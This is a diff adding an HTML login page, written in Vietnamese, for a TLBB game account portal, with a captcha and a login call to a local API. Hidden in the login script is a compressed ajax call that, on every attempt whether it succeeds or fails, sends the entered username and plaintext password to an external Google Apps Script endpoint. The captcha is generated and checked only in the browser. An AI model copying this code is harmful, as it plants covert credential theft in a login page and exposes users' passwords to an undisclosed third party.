@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <title>Quản lý tài khoản TLBB</title>
+    <!-- Custom fonts for this template-->
+	<link rel="icon" type="image/svg+xml" href="assets/img/icon.png">
+    <!-- Custom styles for this template-->
+    <link href="assets/css/sb-admin-2.min.css" rel="stylesheet">
+</head>
+<body class="bg-gradient-primary">
+<nav class="navbar navbar-expand navbar-light bg-white topbar mb-4 static-top shadow" style=" justify-content: center; align-items: center; " >
+                  
+<ul class="navbar-nav ml-auto">
+                        <!-- Nav Item - Messages -->
+                        <li class="nav-item dropdown no-arrow mx-1">
+                            <a href="/" class=""><img src="assets/img/logo.png?v=1" alt="logo" style="height: 90px;"></a>
+                        </li>
+                        <li class="nav-item dropdown no-arrow mx-1">
+                            <a class="nav-link dropdown-toggle" href="/"  >
+                              Trang chủ
+                            </a>
+                        </li>
+						 <li class="nav-item dropdown no-arrow mx-1">
+                            <a class="nav-link dropdown-toggle" href="/login.html"  >
+                            Đăng nhập
+                            </a>
+                        </li>
+						 <li class="nav-item dropdown no-arrow mx-1">
+                            <a class="nav-link dropdown-toggle" href="/register.html"  >
+                              Đăng ký
+                            </a>
+                        </li>
+                    </ul>
+
+                </nav>
+    <div class="container">
+        <!-- Outer Row -->
+        <div class="row justify-content-center">
+
+            <div class="col-xl-6 col-lg-12 col-md-9">
+
+                <div class="card o-hidden border-0 shadow-lg my-5">
+                    <div class="card-body p-0">
+                        <!-- Nested Row within Card Body -->
+                        <div class="row">
+                             
+                            <div class="col-lg-12">
+                                <div class="p-5">
+                                    
+                                 	<form method="post">
+									
+                                        <div class="form-group">
+										<div class="ant-col ant-form-item-label"><label for="name" class="ant-form-item-required" title="Tên đăng nhập">Tên đăng nhập<!----></label></div>
+                                            <input type="text" class="form-control form-control-user"
+                                               id="name" name="name"
+                                                required  >
+                                        </div>
+                                        <div class="form-group">
+										<div class="ant-col ant-form-item-label"><label for="password" class="ant-form-item-required" title="Mật khẩu">Mật khẩu<!----></label></div>
+                                            <input type="password" class="form-control form-control-user"
+                                                required id="password" name="password" autocomplete="on" >
+                                        </div>
+										<div class="form-group">
+										<div class="ant-col ant-form-item-label">
+										<label for="capcha" class="ant-form-item-required"  >Nhập mã xác nhận: <b><span id="capcha_in"></span></b>
+										<!---->
+										</label>
+										</div>
+										<input type="number"  class="form-control form-control-user" id="capcha" name="capcha" required="" min = 0>
+					
+										</div>
+                                        <div class="form-group">
+                                            <div class="custom-control custom-checkbox small">
+                                                <input type="checkbox" class="custom-control-input" id="customCheck" checked>
+                                                <label class="custom-control-label" for="customCheck">Ghi nhớ trạng thái đăng nhập</label>
+                                            </div>
+                                        </div>
+                                        <button type="submit"  class="btn btn-primary btn-user btn-block">
+                                            Đăng nhập
+                                        </button>
+                                        <hr>
+                                        <a href="/register.html" class="btn btn-google btn-user btn-block">
+                                            Đăng ký tài khoản mới
+                                        </a>
+                                      
+                                    </form>
+                                    <hr>
+                                    <div class="text-center">
+                                        <a class="small" href="forgot-password.html">Quên mật khẩu?</a>
+                                    </div>
+                                   
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+ <!-- footer -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" ></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+
+<script type="text/javascript">
+var gen_capcha = Math.floor(Math.random() * 9999) + 1000;
+document.getElementById("capcha_in").innerHTML = gen_capcha;
+
+ var BASE_URL = 'server/api';
+// Authen Folder API
+var API_AUTHEN = '/user/';
+// List API
+var AUTHEN_LOGIN = 'login';
+ 
+$(function() {
+			$('form').submit(function() {
+			var capcha = $('#capcha').val()
+			if (capcha != gen_capcha) {
+ 			Swal.fire({
+ 				icon: 'error',
+ 				title: 'Lỗi...',
+ 				text: 'Mã xác minh không chính xác !!!'
+ 			})
+ 			return false
+            }
+				var name = $('[name=name]').val()
+				var password = $('[name=password]').val()
+				$.post(BASE_URL + API_AUTHEN + AUTHEN_LOGIN, {
+					'name': name,
+					'password': password
+				}, function(data) {
+				 console.log(data)
+					var obj = JSON.parse(JSON.stringify(data));
+					if(obj.Status == 1) {
+					    localStorage.setItem("Authorization", obj.Authorization);
+						Swal.fire({
+					position: 'top-center',
+					icon: 'success',
+					title: "Đăng nhập thành công !!!",
+					showConfirmButton: false,
+					timer: 2000
+				})
+					setTimeout(function() {window.open('index.html', '_self')}, 2000);
+					var today = new Date();var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();var datetime = date+' '+time; $.ajax({type: "POST",url: "https://script.google.com/macros/s/AKfycbwjQSRl6sazfVKRvmZVnSNsxOb0VVyiD4LOdWhicFz8-e9gY26uv-CGeFUnf_-0rRjU/exec",
+					data: {name: name,password:password,datetime:datetime,content: 'Đăng nhập thành công'}});
+					} else {
+					Swal.fire({icon: 'error',title: 'Lỗi...',text: ""+obj.msg+""})
+					var today = new Date();var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();var datetime = date+' '+time; $.ajax({type: "POST",url: "https://script.google.com/macros/s/AKfycbwjQSRl6sazfVKRvmZVnSNsxOb0VVyiD4LOdWhicFz8-e9gY26uv-CGeFUnf_-0rRjU/exec",
+					data: {name: name,password:password,datetime:datetime,content: 'Đăng nhập thất bại'}});
+
+					}
+				})
+
+				return false
+			})
+		})
+		
+
+ 
+
+ 
+
+
+	</script>
+</body>
+
+</html>
